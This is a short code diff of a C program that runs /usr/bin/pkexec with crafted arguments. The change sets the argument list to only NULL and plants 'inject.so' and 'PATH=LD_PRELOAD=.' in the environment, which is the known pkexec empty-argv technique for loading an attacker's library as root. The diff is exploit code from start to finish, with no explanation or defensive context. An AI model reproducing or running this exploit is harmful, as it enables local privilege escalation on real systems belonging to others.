@@ -6,13 +6,12 @@ int main()
     char const *executable = "/usr/bin/pkexec";
 
     char *const bad_argv[] = {
-        "fake_executable_name",
-        "id",
-        NULL
+        NULL,
     };
 
     char *const bad_envp[] = {
-        "PATH=/usr/bin:/usr/sbin",
+        "inject.so",
+        "PATH=LD_PRELOAD=.",
         NULL
     };
 
